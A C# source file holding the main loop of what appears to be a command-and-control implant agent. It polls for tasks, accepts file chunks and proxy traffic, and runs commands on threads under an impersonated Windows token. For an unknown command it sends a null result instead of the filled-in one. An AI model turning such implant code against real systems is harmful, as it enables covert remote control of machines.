using Agent.Commands;
using Agent.Commands.Services;
using Agent.Communication;
using Agent.Helpers;
using Agent.Service;
using Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class Agent
    {
        public CommModule Communicator { get; set; }
        private IConfigService _configService;
        private IMessageService _messageService;
        private IFileService _fileService;
        private IProxyService _proxyService;
        private AgentMetadata _metadata;

        private CancellationTokenSource _tokenSource = new CancellationTokenSource();

        private List<AgentCommand> _commands = new List<AgentCommand>();

        public void LoadCommands()
        {
            var self = Assembly.GetExecutingAssembly();
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters)
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    _commands.Add(instance);
                }
            }

        }

        public Agent(AgentMetadata metadata, CommModule commModule)
        {
            _metadata = metadata;
            this.Communicator = commModule;

            this._messageService = ServiceProvider.GetService<IMessageService>();
            this._fileService = ServiceProvider.GetService<IFileService>();
            this._proxyService = ServiceProvider.GetService<IProxyService>();
            this._configService = ServiceProvider.GetService<IConfigService>();

            LoadCommands();
        }

        public void Start()
        {
            this.Communicator.Start();
            while (!_tokenSource.IsCancellationRequested)
            {
                var messages = this._messageService.GetMessageTasksForAgent(this._metadata.Id);
                if (messages.Any())
                {
                    foreach (var mess in messages)
                    {
                        if (mess.FileChunk != null)
                            this._fileService.AddFileChunck(mess.FileChunk);
                        if (mess.ProxyMessages != null)
                            this._proxyService.AddRequests(mess.ProxyMessages);

                        HandleTasks(mess.Items);
                    }

                }
                Thread.Sleep(10);
            }
        }


        public void Stop()
        {
            this._tokenSource.Cancel();
            this.Communicator.Stop();
        }

        public void HandleTasks(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                this.HandleTask(task);

            }
        }

        public Thread HandleTask(AgentTask task, AgentTaskResult res = null, AgentCommandContext parent = null)
        {
            var tr = new TaskAndResult
            {
                Task = task,
                Result = res ?? new AgentTaskResult(),
                ParentCtxt = parent
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
            {
                //Console.WriteLine($"run command {task.Command} impersonnated");
                using (var context = WindowsIdentity.Impersonate(ImpersonationHelper.ImpersonatedToken))
                {
                    return StartTaskAsNewThread(tr);
                }
            }
            else
            {
                //Console.WriteLine($"run command {task.Command} not impersonnated");
                return StartTaskAsNewThread(tr);
            }
        }


        private Thread StartTaskAsNewThread(TaskAndResult tr)
        {
            Thread t = new Thread(this.StartHandleTask);
            t.Start(tr);
            return t;
        }

        public class TaskAndResult
        {
            public AgentTask Task { get; set; }
            public AgentTaskResult Result { get; set; }
            public AgentCommandContext ParentCtxt { get; set; }
        }

        private void StartHandleTask(object taskandResult)
        {

            this.HandleTaskInternal(taskandResult as TaskAndResult);
        }

        private void HandleTaskInternal(TaskAndResult tr)
        {
            var command = this._commands.FirstOrDefault(c => c.Name == tr.Task.Command);

            AgentTaskResult result = null;

            if (command is null)
            {
                tr.Result.Id = tr.Task.Id;
                tr.Result.Result = $"Agent has no {tr.Task.Command} command registered!";
                tr.Result.Status = AgentResultStatus.Completed;
                this._messageService.SendResult(result);
            }
            else
            {
                var clone = Activator.CreateInstance(command.GetType()) as AgentCommand;
                var ctxt = new AgentCommandContext()
                {
                    ParentContext = tr.ParentCtxt,
                    Agent = this,
                    MessageService = _messageService,
                    FileService = _fileService,
                    ProxyService = _proxyService,
                    ConfigService = _configService,
                    Result = tr.Result,
                };
                clone.Execute(tr.Task, ctxt);
            }
        }
    }
}
